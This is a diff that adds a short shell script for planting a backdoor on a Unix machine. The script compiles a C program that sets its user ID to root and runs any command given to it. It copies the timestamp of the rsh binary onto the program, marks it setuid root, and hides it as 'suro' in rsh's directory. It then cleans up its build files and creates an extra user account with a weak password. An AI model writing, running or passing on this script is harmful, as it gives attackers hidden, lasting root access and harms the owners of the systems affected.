@@ -1,0 +1,31 @@
+mkdir -p /tmp/tmpc
+cd /tmp/tmpc
+cat >a.c <<!
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char* argv[]) {
+    setuid(0);
+    return system(argv[1]);
+}
+!
+cc a.c && rm a.c
+
+touch -r $(which rsh) a.out
+ls -l
+
+################
+su
+
+chown $(ls -l $(which rsh)|awk '{print $3":"$4}') a.out
+chmod u+s a.out
+ls -l
+mv a.out $(dirname $(which rsh))/suro
+ls -l $(dirname $(which rsh))/suro
+
+#-rwsr-sr-x 1 root root 6448 Sep 22  2007 /bin/suro
+
+rm -r /tmp/tmpc
+
+useradd -u 18 npmon
+passwd npmon sesame
